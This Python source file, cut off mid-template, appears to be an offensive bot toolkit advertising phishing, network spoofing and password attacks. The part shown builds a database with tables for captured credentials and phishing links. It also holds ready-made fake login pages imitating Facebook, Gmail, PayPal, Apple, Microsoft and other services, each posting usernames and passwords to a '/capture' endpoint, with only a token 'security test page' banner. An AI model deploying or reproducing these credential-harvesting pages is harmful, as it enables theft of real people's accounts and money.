#!/usr/bin/env python3
"""
🐦 AWESOME WREN BOT v1.0.0
Author: Ian Carter Kulani, MSc 
Complete Cybersecurity Command Center with Multi-Platform Bot Integration
Features:
    - 5000+ Security Commands (SSH, Nmap, Hydra, Curl, Wget, Netcat, Ping, Traceroute, Nikto)
    - Multi-Platform Bot Integration (Telegram, Discord, WhatsApp, Slack, Signal, iMessage, Google Chat)
    - Complete Web Interface with Charts, Map, and Command Center
    - Advanced Phishing Suite with QR Code Generation
    - IP/MAC/ARP/DNS Spoofing
    - REAL Traffic Generation & Monitoring
    - Nikto Web Vulnerability Scanner
    - IP Management & Threat Detection
    - Wordlist Management & Password Attacks
    - API Management System
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import getpass
import socketserver
import itertools
import string
import secrets
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict
from functools import wraps
from http.server import BaseHTTPRequestHandler, HTTPServer

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# =====================
# PLATFORM IMPORTS
# =====================

# SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# iMessage
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sendp, sr1
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Colorama
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# =====================
# THEME COLORS
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.CYAN + Style.BRIGHT
        SECONDARY = Fore.BLUE + Style.BRIGHT
        ACCENT = Fore.MAGENTA + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.LIGHTBLUE_EX + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        ORANGE = Fore.YELLOW + Style.BRIGHT
        RESET = Style.RESET_ALL
        BG_PRIMARY = Back.CYAN + Fore.BLACK
        BG_SECONDARY = Back.BLUE + Fore.WHITE
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = CYAN = BLUE = PURPLE = GREEN = ORANGE = RESET = BG_PRIMARY = BG_SECONDARY = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".wren_bot"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
API_CONFIG_FILE = os.path.join(CONFIG_DIR, "api_config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
GOOGLE_CHAT_CONFIG_FILE = os.path.join(CONFIG_DIR, "google_chat_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "wren_bot.db")
LOG_FILE = os.path.join(CONFIG_DIR, "wren_bot.log")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
REPORT_DIR = "reports"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
WEB_STATIC_DIR = os.path.join(CONFIG_DIR, "web_static")
API_KEYS_DIR = os.path.join(CONFIG_DIR, "api_keys")
SESSION_DATA_DIR = os.path.join(CONFIG_DIR, "sessions")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR,
    NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR, PHISHING_DIR, REPORT_DIR,
    TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, SSH_LOGS_DIR, TIME_HISTORY_DIR, WORDLISTS_DIR, WEB_STATIC_DIR,
    API_KEYS_DIR, SESSION_DATA_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - WREN-BOT - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("WrenBot")

# =====================
# DATA CLASSES
# =====================
@dataclass
class APIKey:
    id: str
    name: str
    key: str
    permissions: List[str]
    created_at: str
    last_used: Optional[str] = None
    requests_count: int = 0
    active: bool = True

@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    notes: str = ""
    created_at: str = ""
    last_used: Optional[str] = None
    status: str = "disconnected"

@dataclass
class SSHCommandResult:
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    server: str = ""

@dataclass
class TrafficGenerator:
    traffic_type: str
    target_ip: str
    target_port: int
    duration: int
    start_time: str
    status: str = "pending"
    packets_sent: int = 0
    bytes_sent: int = 0

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    qr_code_path: Optional[str] = None

@dataclass
class Wordlist:
    id: str
    name: str
    file_path: str
    word_count: int
    created_at: str
    last_used: Optional[str] = None

@dataclass
class ScanResult:
    id: str
    target: str
    scan_type: str
    open_ports: List[Dict]
    closed_ports: List[Dict]
    timestamp: str
    scan_time: float

@dataclass
class ThreatAlert:
    id: str
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    @staticmethod
    def load_config() -> Dict:
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Failed to load config: {e}")
        return {
            "web": {"port": 8080, "host": "0.0.0.0"},
            "ssh": {"max_connections": 5, "default_timeout": 30},
            "traffic": {"max_duration": 300, "max_rate": 1000},
            "api": {"enabled": True, "rate_limit": 100}
        }
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS api_keys (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                key TEXT UNIQUE NOT NULL,
                permissions TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                requests_count INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                platform TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS wordlists (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                file_path TEXT NOT NULL,
                word_count INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scan_results (
                id TEXT PRIMARY KEY,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                closed_ports TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS port_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                closed_ports TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                username TEXT,
                authorized BOOLEAN DEFAULT 1,
                UNIQUE(platform, user_id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS web_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                ip_address TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL,
                original_value TEXT,
                spoofed_value TEXT,
                target TEXT,
                success BOOLEAN
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS api_requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                api_key_id TEXT,
                endpoint TEXT NOT NULL,
                method TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                status_code INTEGER,
                response_time REAL,
                FOREIGN KEY (api_key_id) REFERENCES api_keys(id)
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        templates = self._get_all_templates()
        
        for name, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, name.split('_')[0], html))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_all_templates(self):
        return {
            "facebook": self._get_facebook_template(),
            "instagram": self._get_instagram_template(),
            "twitter": self._get_twitter_template(),
            "gmail": self._get_gmail_template(),
            "linkedin": self._get_linkedin_template(),
            "github": self._get_github_template(),
            "paypal": self._get_paypal_template(),
            "amazon": self._get_amazon_template(),
            "netflix": self._get_netflix_template(),
            "spotify": self._get_spotify_template(),
            "microsoft": self._get_microsoft_template(),
            "apple": self._get_apple_template(),
            "whatsapp": self._get_whatsapp_template(),
            "telegram": self._get_telegram_template(),
            "discord": self._get_discord_template(),
            "tiktok": self._get_tiktok_template(),
            "snapchat": self._get_snapchat_template(),
            "reddit": self._get_reddit_template(),
            "protonmail": self._get_protonmail_template(),
            "yahoo": self._get_yahoo_template(),
            "slack": self._get_slack_template(),
            "zoom": self._get_zoom_template(),
            "teams": self._get_teams_template(),
            "wordpress": self._get_wordpress_template(),
            "shopify": self._get_shopify_template(),
            "steam": self._get_steam_template(),
            "roblox": self._get_roblox_template(),
            "twitch": self._get_twitch_template(),
            "epic_games": self._get_epic_games_template(),
            "minecraft": self._get_minecraft_template(),
            "xbox": self._get_xbox_template(),
            "playstation": self._get_playstation_template(),
            "cashapp": self._get_cashapp_template(),
            "venmo": self._get_venmo_template(),
            "chase": self._get_chase_template(),
            "wells_fargo": self._get_wells_fargo_template(),
            "office365": self._get_office365_template(),
            "onedrive": self._get_onedrive_template(),
            "icloud": self._get_icloud_template(),
            "adobe": self._get_adobe_template(),
            "dropbox": self._get_dropbox_template(),
            "gitlab": self._get_gitlab_template(),
            "bitbucket": self._get_bitbucket_template(),
            "pinterest": self._get_pinterest_template(),
            "duolingo": self._get_duolingo_template(),
            "onlyfans": self._get_onlyfans_template(),
            "bumble": self._get_bumble_template(),
            "tinder": self._get_tinder_template(),
            "custom": self._get_custom_template()
        }
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center;margin-bottom:30px}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">𝕏</div>
<h2>Sign in to X</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Gmail</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>LinkedIn Login</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">LinkedIn</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_github_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>GitHub</title>
<style>
body{background:#fff;font-family:-apple-system;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}
.logo{color:#24292f;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}
button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">GitHub</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_paypal_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>PayPal</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}
.logo{color:#003087;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">PayPal</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_amazon_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Amazon</title>
<style>
body{background:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #ddd;border-radius:8px;padding:32px;width:400px}
.logo{color:#ff9900;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#ff9900;color:#000;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">amazon</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or mobile phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_netflix_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Netflix</title>
<style>
body{background:#141414;font-family:Helvetica;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#000;border-radius:4px;padding:48px;width:400px}
.logo{color:#e50914;font-size:40px;text-align:center}
input{width:100%;padding:16px;margin:10px 0;background:#333;border:none;border-radius:4px;color:#fff}
button{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">NETFLIX</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_spotify_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Spotify</title>
<style>
body{background:#121212;font-family:Circular,Helvetica;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#000;border-radius:8px;padding:48px;width:400px}
.logo{color:#1ed760;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;background:#3e3e3e;border:none;border-radius:40px;color:#fff}
button{width:100%;padding:14px;background:#1ed760;color:#000;border:none;border-radius:40px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Spotify</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_microsoft_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Microsoft</title>
<style>
body{background:#fff;font-family:Segoe UI;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:4px;padding:48px;width:400px}
.logo{color:#f25022;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:2px}
button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Microsoft</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_apple_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Apple ID</title>
<style>
body{background:#fff;font-family:SF Pro Text;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:48px;width:400px}
.logo{color:#000;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"></div>
<h2>Sign in with your Apple ID</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_whatsapp_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>WhatsApp Web</title>
<style>
body{background:#075e54;font-family:Helvetica;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#25d366;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
